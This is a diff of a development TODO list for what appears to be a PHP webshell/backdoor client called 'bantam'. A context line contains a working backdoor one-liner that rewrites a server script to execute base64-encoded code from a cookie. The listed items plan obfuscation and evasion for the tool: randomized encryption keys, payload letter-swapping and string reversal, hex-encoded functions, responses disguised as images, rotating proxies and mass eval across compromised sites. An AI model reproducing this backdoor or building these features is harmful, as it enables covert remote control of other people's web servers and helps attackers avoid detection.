@@ -22,7 +22,6 @@ NEW ITEMS
 * 3 - Advanced options to edit code exectuin type to change from system to exec, etc (global)
 * 3 - bantam self / shell code editor, editing the bantam stored online - file_put_contents($_SERVER["SCRIPT_FILENAME"], '<?php if(isset($_COOKIE["sID"])) {$a=@create_function(null, @base64_decode($_COOKIE["sID"]));$a();}')
 * 2 - enum for the imagelist icons,  and enum for the returned data from file browser
-* 2 - explore the potential of embedding "urldecode(base64_decode())" in the payload everytime instead of inside the backdoor
 * 2 - add validity/testing checking to edit / add shell
 * 3 - Check site before add into clients, if its non existant or shell doesnt work, test with google.com etc
 * 1 - move browserview from a form to a Dynamic "Prompt", reconsider the name "Prompt"
@@ -30,16 +29,17 @@ NEW ITEMS
 * 1 - allowable charector check on var name of backdoor generator 
 * 1 - fake response as b64 image
 * 1 - make row and col seperator random
-# 1 - make encryption key/iv random
 * 1 - encryption - should have option to send as stager or already be uploaded
 * 1 - proxy support credentials
 * 1 - change encryption keys on every request option
 * 1 - randomize proxy automatically in global options panel
+* 1 - if i do eval and type echo '123' it apends to the resposne and breaks the decryption
 * 1 - when mass eval, shouldn't be able to click show response, or make feature to track all responses and show them
 * 1 - payload b64 letter swapping XD
 * 1 - strerev payload or parts of the payload and put it back together?
 * 1 - more logging / reporting i.e if encryption fails or defaults
 * 1 - hex encoded functions  on the php side
 * 1 - max payload size
+* 10 - sort and parse filebrowser!
 
   https://github.com/epinna/weevely3/blob/master/modules/audit/_linuxprivchecker/linuxprivchecker.py - helpful system info
